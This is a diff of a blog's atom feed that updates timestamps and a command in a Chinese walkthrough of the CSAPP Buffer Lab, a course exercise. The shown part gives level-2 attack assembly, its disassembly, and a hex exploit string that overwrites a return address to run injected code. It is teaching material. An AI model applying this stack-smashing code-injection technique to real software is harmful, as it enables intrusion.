@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-05-11T14:57:17.693Z</updated>
+  <updated>2018-05-11T15:02:18.846Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://yoursite.com/2018/05/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-CSAPP-Bufferlab/"/>
     <id>http://yoursite.com/2018/05/12/深入理解计算机系统-CSAPP-Bufferlab/</id>
     <published>2018-05-11T20:29:36.000Z</published>
-    <updated>2018-05-11T14:57:17.693Z</updated>
+    <updated>2018-05-11T15:02:18.846Z</updated>
     
     <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用<code>缓冲区溢出漏洞</code>生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
 <h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
@@ -82,7 +82,7 @@ int getbuf()
 <p>通过在gdb中添加断点并观察，我们可以确定在执行函数<code>getbuf</code>时，栈底<code>%ebp</code>的值为<code>0x55683450</code>。</p>
 <p>接下来我们要通过gcc和objdump生成攻击代码。我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，攻击代码的作用就是设置全解变量的值为cookie的值，如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x52f8c747, %eax</div><div class="line">mov %eax, 0x804c1ec  ;设置全局变量</div><div class="line">add $16, %esp ;修改栈顶</div><div class="line">ret ;返回</div></pre></td></tr></table></figure>
-<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit</code>将攻击代码汇编和反汇编，具体的命令和结果如下：</p>
+<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o</code>将攻击代码汇编和反汇编，具体的命令和结果如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gcc -m32 -c level2-exploit.s </div><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ objdump -d level2-exploit.o</div><div class="line"></div><div class="line">level2-exploit.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	b8 47 c7 f8 52       	mov    $0x52f8c747,%eax</div><div class="line">   5:	a3 ec c1 04 08       	mov    %eax,0x804c1ec</div><div class="line">   a:	83 c4 10             	add    $0x10,%esp</div><div class="line">   d:	c3                   	ret</div></pre></td></tr></table></figure>
 <p>所以我们构建的攻击代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 34 68 55 /* 保存的%ebp以及返回地址(在栈上) */</div><div class="line">b8 47 c7 f8 52 a3 ec c1 </div><div class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</div><div class="line">22 90 04 08  			/* 返回地址指向函数bang */</div></pre></td></tr></table></figure></p>
 <p>可以知道，我们的攻击思路是：<strong>在getbuf函数返回的时候，先将<code>pc</code>跳转到我们刚刚设计的攻击代码开始的地方，执行我们设计的攻击代码，设置全局变量的值，然后在跳转到<code>bang</code>函数执行。</strong></p>
